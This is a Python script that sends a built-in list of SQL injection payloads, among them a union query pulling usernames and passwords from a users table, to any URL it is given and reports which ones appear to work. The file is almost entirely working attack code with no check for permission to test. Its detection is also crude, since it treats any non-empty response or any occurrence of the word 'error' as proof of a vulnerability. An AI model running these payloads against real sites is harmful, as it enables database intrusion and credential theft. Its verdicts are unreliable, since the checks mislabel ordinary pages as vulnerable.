import requests
import time

def test_sql_injection(target_url):
    """
    Test a target URL for SQL injection vulnerabilities
    Returns a dictionary with test results
    """
    results = {
        'target': target_url,
        'vulnerable': False,
        'techniques': {
            'boolean_based': False,
            'time_based': False,
            'error_based': False,
            'union_based': False
        },
        'successful_payloads': [],
        'errors': []
    }

    # Test payloads organized by technique
    payloads = [
        # Boolean-based
        ("' OR '1'='1", "boolean_based"),
        ("' OR 1=1 --", "boolean_based"),
        ("admin' --", "boolean_based"),
        
        # Time-based
        ("' OR (SELECT SLEEP(5)) --", "time_based"),
        ("1' AND SLEEP(5) --", "time_based"),
        
        # Error-based
        ("' AND 1=CONVERT(int, (SELECT @@version)) --", "error_based"),
        ("' OR 1=1 UNION SELECT 1,@@version --", "error_based"),
        
        # Union-based
        ("' UNION SELECT null,username,password FROM users --", "union_based"),
        ("' UNION SELECT 1,2,3,4,5 --", "union_based")
    ]

    for payload, technique in payloads:
        try:
            start_time = time.time()
            
            # Send the payload as a GET parameter
            params = {'userid': payload} if 'userid' in target_url else {'id': payload}
            response = requests.get(target_url, params=params, timeout=10)
            response_time = time.time() - start_time
            
            # Check for different vulnerability indicators
            if technique == 'time_based' and response_time > 5:
                results['vulnerable'] = True
                results['techniques'][technique] = True
                results['successful_payloads'].append(payload)
            
            elif 'error' in response.text.lower() or 'exception' in response.text.lower():
                results['vulnerable'] = True
                results['techniques']['error_based'] = True
                results['successful_payloads'].append(payload)
            
            elif 'username' in response.text.lower() or 'password' in response.text.lower():
                results['vulnerable'] = True
                results['techniques']['union_based'] = True
                results['successful_payloads'].append(payload)
            
            elif len(response.text) != 0 and technique == 'boolean_based':
                results['vulnerable'] = True
                results['techniques']['boolean_based'] = True
                results['successful_payloads'].append(payload)
                
        except Exception as e:
            results['errors'].append(f"Error with payload {payload}: {str(e)}")
    
    return results

